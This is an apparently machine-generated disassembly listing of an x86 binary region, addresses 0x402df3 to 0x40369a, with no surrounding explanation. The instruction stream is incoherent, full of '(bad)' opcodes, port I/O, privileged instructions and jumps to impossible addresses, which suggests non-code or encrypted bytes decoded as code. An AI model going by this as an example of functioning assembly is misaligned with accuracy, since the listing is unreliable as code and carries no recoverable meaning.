  402df3:	jmp    0xad8:0x7d6fd04
  402dfa:	or     edx,esi
  402dfc:	out    dx,al
  402dfd:	in     eax,dx
  402dfe:	iret   
  402dff:	fmulp  st(5),st
  402e01:	lock ret 0xc2d4
  402e05:	in     al,0xe6
  402e07:	mov    ah,0xde
  402e09:	ror    dh,cl
  402e0b:	call   0xee3a16c8
  402e10:	mov    ebp,0xd40105d7
  402e15:	loop   0x402ddf
  402e17:	add    BYTE PTR [eax],cl
  402e19:	enter  0xedb,0xeb
  402e1d:	mov    ebp,0xe3c1e4d1
  402e22:	mov    bl,0xd7
  402e24:	mov    al,0xe9
  402e26:	mov    bh,0xe4
  402e28:	cli    
  402e29:	std    
  402e2a:	fdivp  st(0),st
  402e2c:	add    dh,ch
  402e2e:	call   0xe2fdee1a
  402e33:	rcr    bh,cl
  402e35:	loop   0x402e2f
  402e37:	in     eax,0xf6
  402e39:	add    al,0xe4
  402e3b:	retf   
  402e3c:	or     eax,0xb7e7b3e4
  402e41:	icebp  
  402e42:	stos   BYTE PTR es:[edi],al
  402e43:	int    0xf0
  402e45:	int    0xb4
  402e47:	mov    edx,0xd0d2bfd1
  402e4c:	mov    edi,0xf5f0c801
  402e51:	mov    ebx,0x9fce6fa
  402e56:	retf   0xb0e
  402e59:	or     ecx,DWORD PTR [ecx]
  402e5b:	cld    
  402e5c:	out    dx,eax
  402e5d:	mov    edi,0xf7a4bde9
  402e62:	enter  0xf7b2,0xd1
  402e66:	repz mov al,0xf5
  402e69:	mov    ebp,0xbeb9deb6
  402e6e:	clc    
  402e6f:	(bad)  
  402e70:	fdivrp st(6),st
  402e72:	aam    0x5
  402e74:	cli    
  402e75:	stc    
  402e76:	cld    
  402e77:	not    ch
  402e79:	or     eax,0xca090fd8
  402e7e:	out    dx,al
  402e7f:	shr    ch,1
  402e81:	int3   
  402e82:	mov    ah,0xf2
  402e84:	fld    st(1)
  402e86:	out    dx,eax
  402e87:	test   ch,0xfb
  402e8a:	mov    ebp,0xbaf202cb
  402e8f:	add    bh,BYTE PTR [edi+eiz*8-0x36fe010f]
  402e96:	in     al,0x5
  402e98:	fstp   st(5)
  402e9a:	(bad)  
  402e9b:	fucom  st(4)
  402e9d:	lods   al,BYTE PTR ds:[esi]
  402e9e:	rcl    dl,cl
  402ea0:	repnz retf 0xe4c9
  402ea4:	retf   
  402ea5:	retf   
  402ea6:	fyl2x  
  402ea8:	inc    ch
  402eaa:	hlt    
  402eab:	enter  0xfefd,0xd0
  402eaf:	fiadd  WORD PTR [eax]
  402eb1:	ror    DWORD PTR [ebx],0xc2
  402eb4:	add    eax,0xfef5f409
  402eb9:	pop    es
  402eba:	or     bl,ah
  402ebc:	push   cs
  402ebd:	retf   
  402ebe:	scas   eax,DWORD PTR es:[edi]
  402ebf:	int    0xdc
  402ec1:	in     al,dx
  402ec2:	mov    dl,0xc7
  402ec4:	test   al,0xb0
  402ec6:	jmp    0x402ebf
  402ec8:	out    0xd7,al
  402eca:	out    dx,al
  402ecb:	mov    ecx,0xe7b8e2f1
  402ed0:	rol    BYTE PTR [edi],cl
  402ed2:	test   DWORD PTR ds:0x8fedbdf,0xff04ffff
  402edc:	in     al,dx
  402edd:	scas   eax,DWORD PTR es:[edi]
  402ede:	out    0xd6,eax
  402ee0:	mov    dh,0xe6
  402ee2:	leave  
  402ee3:	fidiv  DWORD PTR [edi-0x241a1128]
  402ee9:	into   
  402eea:	retf   
  402eeb:	mov    cl,0xf8
  402eed:	bnd jmp edi
  402ef0:	hlt    
  402ef1:	mov    DWORD PTR [edx],0xe302fdd6
  402ef7:	add    cl,BYTE PTR [edi]
  402ef9:	retf   0xe00a
  402efc:	retf   
  402efd:	fisub  WORD PTR [esi-0x31365b10]
  402f03:	shl    DWORD PTR [edx-0x10300539],1
  402f09:	leave  
  402f0a:	clc    
  402f0b:	std    
  402f0c:	out    dx,eax
  402f0d:	sti    
  402f0e:	add    edx,esp
  402f10:	fadd   st,st(6)
  402f12:	rcr    edi,0x6
  402f15:	or     dh,ch
  402f17:	or     DWORD PTR [ecx],ecx
  402f19:	std    
  402f1a:	(bad)  
  402f1b:	stc    
  402f1c:	out    dx,al
  402f1d:	shr    DWORD PTR [esi-0x4c351b58],cl
  402f23:	int3   
  402f24:	(bad)  
  402f25:	mov    ebx,0xfaddbfe4
  402f2a:	push   DWORD PTR [ebp-0x41022938]
  402f30:	(bad)  
  402f31:	loopne 0x402f08
  402f33:	cmc    
  402f34:	fdivr  st(4),st
  402f36:	retf   0xd9ca
  402f39:	jmp    0xc51d3d28
  402f3e:	imul   DWORD PTR [esp+ebp*4-0x3e252c2c]
  402f45:	call   0xcd33e3fa
  402f4a:	(bad)  
  402f4c:	repnz mov edx,0xbcf7e203
  402f52:	shl    dh,cl
  402f54:	hlt    
  402f55:	or     edx,ebx
  402f57:	add    al,0xf8
  402f59:	leave  
  402f5a:	in     al,dx
  402f5b:	or     ch,bh
  402f5d:	mov    eax,0xe3bceae1
  402f62:	div    DWORD PTR [esi-0x35251513]
  402f68:	mov    edi,0xfaf0f9fa
  402f6d:	test   ah,0xdc
  402f70:	aam    0xbc
  402f72:	fdivr  st,st(2)
  402f74:	(bad)  
  402f76:	cmc    
  402f77:	add    al,0x1
  402f79:	(bad)  
  402f7a:	stc    
  402f7b:	stc    
  402f7c:	out    0xbf,al
  402f7e:	(bad)  
  402f7f:	jecxz  0x402f29
  402f81:	not    dl
  402f83:	mov    dh,0xd3
  402f85:	mov    cl,0xd2
  402f87:	mov    edx,0xcad4d4d3
  402f8c:	fld    st(2)
  402f8e:	mov    eax,0xf0d0f8f2
  402f93:	(bad)
  402f96:	jmp    0x402f81
  402f98:	out    0xca,eax
  402f9a:	(bad)  
  402f9c:	out    dx,eax
  402f9d:	mov    esp,0xced2ebeb
  402fa2:	lods   al,BYTE PTR ds:[esi]
  402fa3:	out    dx,eax
  402fa4:	shr    ebx,0xcd
  402fa7:	hlt    
  402fa8:	icebp  
  402fa9:	in     al,0xf5
  402fab:	mov    ebp,0xedbdbfc3
  402fb0:	aam    0xf3
  402fb2:	push   es
  402fb3:	or     dh,al
  402fb5:	(bad)  
  402fb6:	fadd   st,st(4)
  402fb8:	jmp    esi
  402fba:	push   cs
  402fbb:	jmp    0xf5ca:0xe6cbaa0e
  402fc2:	(bad)
  402fc5:	loopne 0x402fc1
  402fc7:	in     al,0xda
  402fc9:	clc    
  402fca:	mov    dl,0xd8
  402fcc:	fdiv   st,st(2)
  402fce:	cmc    
  402fcf:	clc    
  402fd0:	out    0xd0,al
  402fd2:	rol    edx,0xd0
  402fd5:	loopne 0x402fe1
  402fd7:	push   es
  402fd8:	jmp    0xcb3d16e1
  402fdd:	stos   BYTE PTR es:[edi],al
  402fde:	mov    esi,0xc5e7d5dd
  402fe3:	mov    ebx,0xd3d9b5d6
  402fe8:	rcr    dl,1
  402fea:	rcr    al,1
  402fec:	int3   
  402fed:	rcr    bh,1
  402fef:	push   es
  402ff0:	aam    0xde
  402ff2:	mov    edx,0xdad7f2eb
  402ff7:	or     cl,bl
  402ff9:	or     al,0xd9
  402ffb:	sti    
  402ffc:	call   0xcc0e10b3
  403001:	jmp    0xbab1:0xb9d1d4ca
  403008:	int3   
  403009:	repnz (bad) 
  40300c:	xlat   BYTE PTR ds:[ebx]
  40300d:	out    dx,al
  40300e:	clc    
  40300f:	iret   
  403010:	cld    
  403011:	mov    edi,0xd6ebe4fd
  403016:	or     al,cl
  403018:	or     cl,BYTE PTR [esi]
  40301a:	fcom   st(3)
  40301c:	int3   
  40301d:	in     al,0xe5
  40301f:	out    0xec,eax
  403021:	mov    bh,0xf0
  403023:	bnd jmp 0x2ee71f
  403029:	imul   dl
  40302b:	rcr    esp,1
  40302d:	ret    0xd3d6
  403030:	out    0xdd,al
  403032:	cld    
  403033:	ffree  st(7)
  403035:	stc    
  403036:	idiv   ch
  403038:	leave  
  403039:	fucompp 
  40303b:	jmp    0xeec8:0xe8b3be0c
  403042:	mov    bl,0xf1
  403044:	fld    st(5)
  403046:	repz (bad) 
  403048:	sti    
  403049:	retf   
  40304a:	mov    esp,0xcfb8e1ca
  40304f:	sar    BYTE PTR [esi-0x2619052f],1
  403055:	rcl    al,1
  403057:	jmp    0xe942315b
  40305c:	bswap  edi
  40305e:	mov    ebp,0xb7dce2d7
  403063:	mov    bh,0xb3
  403065:	(bad)  
  403066:	mov    ch,0xfb
  403068:	repnz clc 
  40306a:	mov    eax,0xf1e8f9c8
  40306f:	ret    
  403070:	loop   0x403048
  403072:	ffree  st(4)
  403074:	fdiv   st,st(0)
  403076:	or     ah,ch
  403078:	clc    
  403079:	retf   
  40307a:	out    0x5,eax
  40307c:	retf   0xeaa7
  40307f:	shl    dl,0xe6
  403082:	mul    ch
  403084:	out    0xdb,al
  403086:	(bad)  
  403087:	mov    dh,0xdf
  403089:	in     eax,0xc9
  40308b:	fsubr  st,st(7)
  40308d:	clc    
  40308e:	(bad)  
  40308f:	aam    0xee
  403091:	ret    
  403092:	add    eax,DWORD PTR [edx]
  403094:	in     eax,0x8
  403096:	call   0xe22b0699
  40309b:	in     al,dx
  40309c:	add    al,0xc5
  40309e:	jmp    0xc11d1c95
  4030a3:	div    bl
  4030a5:	jmp    0x40308f
  4030a7:	mov    ah,0xe5
  4030a9:	iret   
  4030aa:	(bad)  
  4030ab:	call   0xe319fd6c
  4030b0:	(bad)  
  4030b2:	mov    esp,0xfed4db04
  4030b7:	fidivr DWORD PTR [ebx+ecx*8-0x3402ff1a]
  4030be:	icebp  
  4030bf:	jecxz  0x40309f
  4030c1:	ret    0xade9
  4030c4:	in     al,0xcc
  4030c6:	shl    DWORD PTR [ecx+ebx*8-0x32344715],cl
  4030cd:	fdivrp st(0),st
  4030cf:	(bad)  
  4030d1:	out    0xd7,al
  4030d3:	icebp  
  4030d4:	icebp  
  4030d5:	out    0xe0,al
  4030d7:	out    0x5,eax
  4030d9:	in     eax,0xe6
  4030db:	into   
  4030dc:	add    eax,0xf1adc9ab
  4030e1:	ret    
  4030e2:	mov    ah,0xca
  4030e4:	into   
  4030e5:	jmp    0x4030b2
  4030e7:	mov    dh,0xda
  4030e9:	clc    
  4030ea:	mov    ebp,0xc3e1bc
  4030ef:	loope  0x4030e7
  4030f1:	rcl    al,0xbc
  4030f4:	or     ah,ah
  4030f6:	pop    es
  4030f7:	call   0xd3df4f7
  4030fc:	adc    DWORD PTR [eax-0x350c3715],edi
  403102:	fdivr  st(3),st
  403104:	sar    ecx,0xf5
  403107:	mov    edi,0xfb03eeef
  40310c:	loop   0x4030d6
  40310e:	add    ah,dl
  403110:	cli    
  403111:	out    0xc6,eax
  403113:	fsubr  st,st(1)
  403115:	rcl    ebp,0xf4
  403118:	fdivp  st(4),st
  40311a:	cld    
  40311b:	in     al,dx
  40311c:	add    al,0xe5
  40311e:	shl    BYTE PTR [eax-0x3e3b1642],0xb1
  403125:	mov    dl,0xbb
  403127:	retf   0xbbbe
  40312a:	int    0xca
  40312c:	retf   0xd8ec
  40312f:	ret    0xf9df
  403132:	repnz in al,0x9
  403135:	(bad)  
  403136:	cld    
  403137:	fsubr  st(3),st
  403139:	loopne 0x403109
  40313b:	adc    bl,cl
  40313d:	loope  0x403136
  40313f:	retf   0xeead
  403142:	sti    
  403143:	shl    BYTE PTR [eax-0x4037394f],1
  403149:	aad    0xbf
  40314b:	rol    edx,1
  40314d:	std    
  40314e:	jecxz  0x403128
  403150:	stc    
  403151:	(bad)  
  403152:	hlt    
  403153:	add    eax,0xf9e1d1de
  403158:	cld    
  403159:	push   cs
  40315a:	out    0xed,eax
  40315c:	out    0xca,al
  40315e:	rol    cl,1
  403160:	(bad)  
  403161:	shl    BYTE PTR [edi-0x6320b3c],0xd8
  403168:	leave  
  403169:	(bad)  
  40316a:	(bad)  
  40316c:	mov    esi,0xf3f9c3f1
  403171:	in     al,0xe1
  403173:	repz mul ecx
  403176:	call   0xe4411c5f
  40317b:	add    DWORD PTR [eax],ecx
  40317d:	(bad)  
  40317e:	mov    cl,0xdf
  403180:	rol    esp,0xb5
  403183:	call   0xd80a0168
  403188:	fucomp st(7)
  40318a:	mov    esp,0xdcbab4ed
  40318f:	iret   
  403190:	mov    esi,0xfdc7dfed
  403195:	mov    edi,0xafbf6df
  40319a:	in     al,0xe9
  40319c:	jecxz  0x40315e
  40319e:	icebp  
  40319f:	(bad)
  4031a2:	fdiv   QWORD PTR [edx-0xa2a5037]
  4031a8:	leave  
  4031a9:	out    dx,eax
  4031aa:	repnz out dx,al
  4031ac:	(bad)  
  4031ad:	fdivp  st(5),st
  4031af:	icebp  
  4031b0:	(bad)  
  4031b2:	icebp  
  4031b3:	push   es
  4031b4:	add    dl,bh
  4031b6:	or     eax,esp
  4031b8:	(bad)  
  4031b9:	jmp    0x4031c3
  4031bb:	retf   
  4031bc:	push   cs
  4031bd:	retf   
  4031be:	scas   eax,DWORD PTR es:[edi]
  4031bf:	lock ret 
  4031c1:	mov    ch,0xd1
  4031c3:	shl    BYTE PTR [edx-0x11454815],0xfa
  4031ca:	jmp    0x506:0xd5f3b9cc
  4031d1:	ret    
  4031d2:	add    edi,eax
  4031d4:	add    ch,ah
  4031d6:	retf   
  4031d7:	add    esi,edx
  4031d9:	retf   
  4031da:	out    dx,al
  4031db:	(bad)  
  4031dc:	fmul   st,st(0)
  4031de:	lods   eax,DWORD PTR ds:[esi]
  4031df:	mov    esp,0xdbb1cded
  4031e4:	icebp  
  4031e5:	out    dx,al
  4031e6:	(bad)  
  4031e8:	(bad)  
  4031e9:	shr    eax,1
  4031eb:	mov    esp,0xdcddbeff
  4031f0:	mov    esp,0xcaded305
  4031f5:	or     esi,esp
  4031f7:	out    0xca,al
  4031f9:	(bad)  
  4031fa:	loope  0x4031d4
  4031fc:	add    al,0xb3
  4031fe:	mov    esp,0xc7b3dde8
  403203:	out    dx,eax
  403204:	hlt    
  403205:	jmp    0x4031be
  403207:	fsqrt  
  403209:	out    dx,eax
  40320a:	add    edi,esi
  40320c:	iret   
  40320d:	test   DWORD PTR [edx],0xdd01daed
  403213:	mov    ebp,0xeeea0604
  403218:	out    0xef,al
  40321a:	or     ecx,edx
  40321c:	push   cs
  40321d:	rol    edx,1
  40321f:	mov    cl,0xaf
  403221:	ret    
  403222:	int    0xb7
  403224:	lods   al,BYTE PTR ds:[esi]
  403225:	icebp  
  403226:	fcomi  st,st(5)
  403228:	out    dx,eax
  403229:	enter  0xfad3,0xe1
  40322d:	leave  
  40322e:	sti    
  40322f:	clc    
  403230:	clc    
  403231:	stc    
  403232:	(bad)  
  403233:	fcmovb st,st(6)
  403235:	aam    0xe6
  403237:	loopne 0x403248
  403239:	(bad)  
  40323b:	(bad)  
  40323d:	sar    BYTE PTR [edi-0x51102d2e],0xe0
  403244:	not    bl
  403246:	out    dx,eax
  403247:	stc    
  403248:	repz in eax,0xe4
  40324b:	mov    ecx,0xc0d1d5f9
  403250:	cli    
  403251:	mov    edi,0x2bcc3c0
  403256:	cld    
  403257:	add    ah,ah
  403259:	loopne 0x403228
  40325b:	jecxz  0x403237
  40325d:	out    dx,al
  40325e:	les    ebp,FWORD PTR [esi-0x40b375c]
  403264:	mov    dh,0xcb
  403266:	retf   
  403267:	leave  
  403268:	sti    
  403269:	mov    ebx,0xbd02bcef
  40326e:	iret   
  40326f:	(bad)  
  403271:	vpmaxub xmm6,xmm7,xmm0
  403275:	sti    
  403276:	jmp    0xdb07f946
  40327b:	retf   0xa8e1
  40327e:	(bad)  
  40327f:	(bad)  
  403281:	out    0xef,al
  403283:	retf   
  403284:	fnstenv [edx-0x41240111]
  40328a:	neg    ebx
  40328c:	(bad)  
  40328e:	int    0xf9
  403290:	mov    esi,0xc1fbf1e2
  403295:	loopne 0x4032a1
  403297:	add    ebp,ebp
  403299:	fisttp WORD PTR [ebx]
  40329b:	push   cs
  40329c:	or     bh,BYTE PTR [ebp-0xb153329]
  4032a2:	shl    ch,1
  4032a4:	cmc    
  4032a5:	enter  0xc4b6,0xfe
  4032a9:	stc    
  4032aa:	fdiv   st,st(0)
  4032ac:	repz leave 
  4032ae:	mov    esp,0xd9fbf7f7
  4032b3:	(bad)  
  4032b4:	mov    eax,0x90b0006
  4032b9:	add    ah,cl
  4032bb:	fcmovne st,st(6)
  4032bd:	stos   BYTE PTR es:[edi],al
  4032be:	out    dx,eax
  4032bf:	fsub   st(0),st
  4032c1:	retf   
  4032c2:	in     al,dx
  4032c3:	mov    dl,0xf6
  4032c5:	out    0xea,eax
  4032c7:	fcom   st(7)
  4032c9:	cli    
  4032ca:	cli    
  4032cb:	out    dx,al
  4032cc:	cmc    
  4032cd:	in     al,dx
  4032ce:	repz stc 
  4032d0:	rol    cl,cl
  4032d2:	(bad)  
  4032d4:	fld    QWORD PTR [edx]
  4032d6:	retf   0xc5ca
  4032d9:	fdivr  st,st(6)
  4032db:	in     eax,0xde
  4032dd:	out    dx,al
  4032de:	mov    esi,0xd4d1f0e8
  4032e3:	mov    bh,0xd2
  4032e5:	xlat   BYTE PTR ds:[ebx]
  4032e6:	mov    al,0xb1
  4032e8:	fcom   st(1)
  4032ea:	(bad)  
  4032ec:	lock leave 
  4032ee:	cmc    
  4032ef:	rcl    esp,0xc2
  4032f2:	loopne 0x4032bf
  4032f4:	jmp    0x4032ba
  4032f6:	jmp    eax
  4032f8:	test   BYTE PTR ds:0xc8e00bd4,0xb2
  4032ff:	mov    al,0xc1
  403301:	lods   al,BYTE PTR ds:[esi]
  403302:	in     al,dx
  403303:	lods   al,BYTE PTR ds:[esi]
  403304:	retf   
  403305:	rcl    esp,0xce
  403308:	shl    BYTE PTR [esi-0x4fd300b],cl
  40330e:	(bad)  
  40330f:	sti    
  403310:	sti    
  403311:	std    
  403312:	les    eax,FWORD PTR [eax+eax*1]
  403315:	rol    BYTE PTR ds:0xe90dfa03,0x7
  40331c:	loop   0x4032f6
  40331e:	int    0xc4
  403320:	out    0xe0,al
  403322:	ret    0xd1e9
  403325:	fidivr DWORD PTR [ebx-0x52e3750]
  40332b:	sti    
  40332c:	mov    esi,0xedf2d6bd
  403331:	rol    edx,cl
  403333:	fucom  st(4)
  403335:	(bad)  
  403337:	cmc    
  403338:	sti    
  403339:	cli    
  40333a:	int3   
  40333b:	fucompp 
  40333d:	repnz stos BYTE PTR es:[edi],al
  40333f:	lock iret 
  403341:	lods   al,BYTE PTR ds:[esi]
  403342:	loope  0x40330a
  403344:	test   al,0xcf
  403346:	mov    ecx,0xbac5e4df
  40334b:	jecxz  0x40330a
  40334d:	mov    edi,0xc1eec2da
  403352:	(bad)  
  403353:	(bad)  
  403354:	retf   0xeafb
  403357:	loope  0x40333b
  403359:	or     dl,bl
  40335b:	fprem  
  40335d:	mov    cl,0xc1
  40335f:	int3   
  403360:	fdivrp st(3),st
  403362:	(bad)  
  403363:	sti    
  403364:	loope  0x403346
  403366:	test   ah,0xfe
  403369:	xlat   BYTE PTR ds:[ebx]
  40336a:	retf   
  40336b:	add    al,bl
  40336d:	not    cl
  40336f:	out    0xf4,eax
  403371:	inc    ebp
  403373:	ret    
  403374:	rcr    edx,1
  403376:	rol    BYTE PTR [ebx],0xd5
  403379:	loop   0x403357
  40337b:	clc    
  40337c:	loope  0x403342
  40337e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40337f:	loopne 0x403342
  403381:	iret   
  403382:	lods   al,BYTE PTR ds:[esi]
  403383:	mov    dh,0xc8
  403385:	out    0xd9,al
  403387:	call   0xcc132e59
  40338c:	hlt    
  40338d:	out    dx,al
  40338e:	in     al,dx
  40338f:	mov    eax,0xe3ecd3bd
  403394:	std    
  403395:	rol    ecx,1
  403397:	rcr    dl,0xee
  40339a:	out    dx,eax
  40339b:	enter  0xe6de,0xc3
  40339f:	mov    edi,0xc5eec5cb
  4033a4:	retf   0xf7f2
  4033a7:	imul   cl
  4033a9:	fcomp  st(6)
  4033ab:	(bad)  
  4033ac:	idiv   DWORD PTR [ecx+edi*8-0x3cff2226]
  4033b3:	repz (bad) 
  4033b5:	mul    ah
  4033b7:	(bad)
  4033ba:	or     eax,0xf1e703e2
  4033bf:	lods   eax,DWORD PTR ds:[esi]
  4033c0:	loop   0x403386
  4033c2:	int3   
  4033c3:	jmp    0xf4f9ebad
  4033c8:	int3   
  4033c9:	aad    0xcb
  4033cb:	mov    ecx,0xf4b8e1d6
  4033d0:	in     eax,0xbe
  4033d2:	shl    bh,0xde
  4033d5:	xlat   BYTE PTR ds:[ebx]
  4033d6:	out    0xd5,eax
  4033d8:	stc    
  4033d9:	in     eax,dx
  4033da:	int3   
  4033db:	add    ah,bl
  4033dd:	in     al,0xf0
  4033df:	in     al,0xc7
  4033e1:	rol    al,cl
  4033e3:	into   
  4033e4:	leave  
  4033e5:	mov    ebx,0xd5f3c8fb
  4033ea:	in     eax,dx
  4033eb:	jecxz  0x4033c8
  4033ed:	loop   0x4033c9
  4033ef:	fnop   
  4033f1:	pop    es
  4033f2:	rcl    ebx,0xbc
  4033f5:	idiv   edx
  4033f7:	(bad)  
  4033f8:	cli    
  4033f9:	leave  
  4033fa:	aam    0xcd
  4033fc:	stc    
  4033fd:	(bad)  
  4033fe:	call   0xd4f416ea
  403403:	iret   
  403404:	xlat   BYTE PTR ds:[ebx]
  403405:	(bad)  
  403406:	mov    bh,0xc7
  403408:	jmp    0xdbbd:0xd0feeff8
  40340f:	mov    eax,0xe2fdecd4
  403414:	out    0xda,al
  403416:	(bad)  
  403417:	or     esi,ebx
  403419:	or     eax,0xbe0dff0b
  40341e:	out    dx,al
  40341f:	loopne 0x403418
  403421:	loop   0x403407
  403423:	jmp    0xbb18e3e8
  403428:	mov    eax,0xf4e3feb5
  40342d:	mov    edx,0xfad3feff
  403432:	jmp    0x403417
  403434:	in     al,0xe4
  403436:	fadd   DWORD PTR [ebx]
  403438:	(bad)
  40343b:	enter  0xc309,0xd7
  40343f:	mov    ebp,0xc5cae2bd
  403444:	mul    esp
  403446:	shl    al,cl
  403448:	out    dx,al
  403449:	les    eax,FWORD PTR [ebx]
  40344b:	mov    cl,0xc3
  40344d:	mov    edx,0xfae006bd
  403452:	ret    0xc6f2
  403455:	in     al,0xde
  403457:	xlat   BYTE PTR ds:[ebx]
  403458:	test   BYTE PTR [edx+ecx*1],0xde
  40345c:	add    ch,BYTE PTR [ebp-0x232a0815]
  403462:	in     al,dx
  403463:	les    edi,FWORD PTR [ebx-0x4f36352c]
  403469:	(bad)
  40346c:	mov    al,0xed
  40346e:	aam    0xce
  403470:	loope  0x40345f
  403472:	icebp  
  403473:	pop    es
  403474:	aad    0xea
  403476:	test   BYTE PTR [esi],0x0
  403479:	fsubr  st,st(5)
  40347b:	(bad)  
  40347c:	fst    st(1)
  40347e:	xlat   BYTE PTR ds:[ebx]
  40347f:	rcl    ecx,cl
  403481:	retf   
  403482:	jmp    0x403474
  403484:	loopne 0x403474
  403486:	cmc    
  403487:	in     eax,0xd9
  403489:	mov    esi,0xd1e9bfe9
  40348e:	aad    0xec
  403490:	ret    0xbd6
  403493:	aad    0x5
  403495:	jmp    0xf46089b
  40349a:	into   
  40349b:	loopne 0x403488
  40349d:	mov    eax,0xd1c1d1ef
  4034a2:	jmp    0xeded:0xfbeddad2
  4034a9:	in     eax,0xc9
  4034ab:	fdivp  st(0),st
  4034ad:	aam    0xed
  4034af:	xlat   BYTE PTR ds:[ebx]
  4034b0:	mov    DWORD PTR [esi],0x9e5f8f1
  4034b6:	psadbw mm3,mm5
  4034b9:	jmp    0xf20b18a0
  4034be:	scas   eax,DWORD PTR es:[edi]
  4034bf:	out    dx,eax
  4034c0:	retf   
  4034c1:	stos   DWORD PTR es:[edi],eax
  4034c2:	jmp    0x403485
  4034c4:	out    dx,eax
  4034c5:	scas   eax,DWORD PTR es:[edi]
  4034c6:	retf   
  4034c7:	hlt    
  4034c8:	jmp    0x40347e
  4034ca:	leave  
  4034cb:	mov    esi,0xf8f3f2bc
  4034d0:	fnclex 
  4034d2:	mov    DWORD PTR ds:0xe7cad1e7,0x13cadada
  4034dc:	jmp    0xfbe8:0xc8c6cee6
  4034e3:	cli    
  4034e4:	loop   0x4034cc
  4034e6:	fcmovb st,st(5)
  4034e8:	out    dx,al
  4034e9:	out    dx,eax
  4034ea:	in     al,dx
  4034eb:	leave  
  4034ec:	enter  0xf1d7,0xc3
  4034f0:	loop   0x4034e2
  4034f2:	rcl    ebp,cl
  4034f4:	std    
  4034f5:	hlt    
  4034f6:	or     cl,al
  4034f8:	loop   0x4034d3
  4034fa:	out    0xfa,eax
  4034fc:	shr    BYTE PTR [edx-0x19194d2d],cl
  403502:	ret    0xe9a9
  403505:	jmp    0x4034b5
  403507:	in     al,0xb9
  403509:	rol    DWORD PTR [ebx],cl
  40350b:	call   0xdefd090c
  403510:	(bad)  
  403511:	cli    
  403512:	mov    ebp,0xbe0bdf03
  403517:	add    ch,cl
  403519:	(bad)  
  40351a:	iret   
  40351b:	sar    edx,cl
  40351d:	jmp    0x4034f7
  40351f:	lods   al,BYTE PTR ds:[esi]
  403520:	div    DWORD PTR [edi-0x49114e14]
  403526:	mov    cl,0xb9
  403528:	out    dx,eax
  403529:	mov    edx,0xc9c9dbdc
  40352e:	sti    
  40352f:	out    dx,al
  403530:	(bad)  
  403532:	hlt    
  403533:	fdivr  st,st(3)
  403535:	not    bh
  403537:	in     eax,0xd9
  403539:	(bad)
  40353c:	or     ebx,eax
  40353e:	fbstp  TBYTE PTR [ebx-0xf2c511b]
  403544:	repz ror bh,cl
  403547:	icebp  
  403548:	test   ebp,0xb8d9edef
  40354e:	repz in eax,dx
  403550:	pop    es
  403551:	add    al,0xe7
  403553:	rcl    ah,1
  403555:	fimul  DWORD PTR [ecx]
  403557:	or     dh,dh
  403559:	add    eax,0xc903cbe7
  40355e:	out    dx,eax
  40355f:	out    0xd6,eax
  403561:	out    0xcc,al
  403563:	out    0xef,eax
  403565:	(bad)  
  403566:	rol    bh,cl
  403568:	call   ebx
  40356a:	out    dx,al
  40356b:	std    
  40356c:	mov    eax,0xd8c1bde9
  403571:	hlt    
  403572:	(bad)  
  403573:	(bad)  
  403575:	aad    0xf5
  403577:	test   al,0xc9
  40357a:	ret    0xcf04
  40357d:	fdivr  QWORD PTR [esi+ebx*8-0x2555134f]
  403584:	mov    bh,0xe4
  403586:	(bad)  
  403587:	rcr    ebx,1
  403589:	mov    ebp,0xfcf8cdbe
  40358e:	shl    ecx,0xed
  403591:	in     al,0xb
  403593:	cmc    
  403594:	std    
  403595:	(bad)  
  403596:	fmul   DWORD PTR [edi]
  403598:	fsubr  st(6),st
  40359a:	call   0xebff1f99
  40359f:	shl    BYTE PTR [edx-0xb0f3109],0xb3
  4035a6:	mov    bh,0xb1
  4035a8:	jmp    0xf0f1ff9c
  4035ad:	div    BYTE PTR [esi-0x263ffc3d]
  4035b3:	rcr    al,1
  4035b5:	hlt    
  4035b6:	aad    0xf8
  4035b8:	fcmovne st,st(5)
  4035ba:	loopne 0x4035a8
  4035bc:	int3   
  4035bd:	mov    ecx,0xceccacc3
  4035c2:	rcl    ebx,0xe1
  4035c5:	mov    cl,0xd1
  4035c7:	sti    
  4035c8:	fcmovnu st,st(5)
  4035ca:	aam    0xd3
  4035cc:	(bad)  
  4035ce:	ret    0x1dd
  4035d1:	icebp  
  4035d2:	mov    esi,0xdccae7dd
  4035d7:	shl    ecx,0xd5
  4035da:	cld    
  4035db:	or     dl,BYTE PTR [ecx]
  4035dd:	mov    esp,0xb1c5dcf7
  4035e2:	jmp    0xefb8:0xfac4fbf2
  4035e9:	lock jmp 0xe6e6:0xf1e2f1b9
  4035f1:	out    0xda,eax
  4035f3:	(bad)
  4035f6:	(bad)  
  4035f7:	out    0xf,eax
  4035f9:	fild   DWORD PTR ds:0xb2d0c8e7
  4035ff:	rcr    esi,cl
  403601:	in     al,0xeb
  403603:	jmp    0x4035fa
  403605:	out    0xdf,al
  403607:	jmp    0x4035c0
  403609:	enter  0xfce8,0xdb
  40360d:	(bad)  
  40360e:	(bad)  
  40360f:	ror    esi,1
  403611:	(bad)  
  403612:	clc    
  403613:	fst    st(5)
  403615:	pop    es
  403616:	loopne 0x4035dc
  403618:	add    ebp,ebx
  40361a:	in     al,0xe0
  40361c:	call   0xf628f4ff
  403621:	(bad)  
  403622:	mov    dh,0xad
  403624:	cmc    
  403625:	int    0xdf
  403627:	cmc    
  403628:	std    
  403629:	shl    al,cl
  40362b:	int    0xff
  40362d:	mov    edx,0xd9fbd3d4
  403632:	add    ecx,ebx
  403634:	shr    ecx,1
  403636:	ret    0xfbe7
  403639:	loopne 0x403615
  40363b:	out    0xce,eax
  40363d:	stos   DWORD PTR es:[edi],eax
  40363e:	ret    0xcfbe
  403641:	ret    0xb6dc
  403644:	into   
  403645:	out    dx,eax
  403646:	fnstenv [esi-0x27451b2d]
  40364c:	jecxz  0x40360f
  40364e:	rcr    ecx,cl
  403650:	cmc    
  403651:	mov    esi,0xf1dbdd04
  403656:	(bad)
  403659:	int    0xdc
  40365b:	fnstsw ax
  40365d:	fistp  QWORD PTR [edi-0x1429092d]
  403663:	retf   
  403664:	shr    DWORD PTR [edi-0x4139152f],0xeb
  40366b:	hlt    
  40366c:	mov    eax,0xecd9e3d2
  403671:	int    0xfe
  403673:	loop   0x40365c
  403675:	lock jecxz 0x403641
  403678:	iret   
  403679:	or     al,0xb
  40367b:	add    ecx,esi
  40367d:	(bad)  
  40367e:	jmp    0xc7f6:0xebc4e4c5
  403685:	enter  0xe6ce,0xf4
  403689:	in     al,dx
  40368a:	mov    eax,0x3f8b8fc
  40368f:	neg    bh
  403691:	(bad)  
  403693:	cmc    
  403694:	hlt    
  403695:	sar    al,0xc5
  403698:	in     al,0xf
  40369a:	or     cl,BYTE PTR [eax]
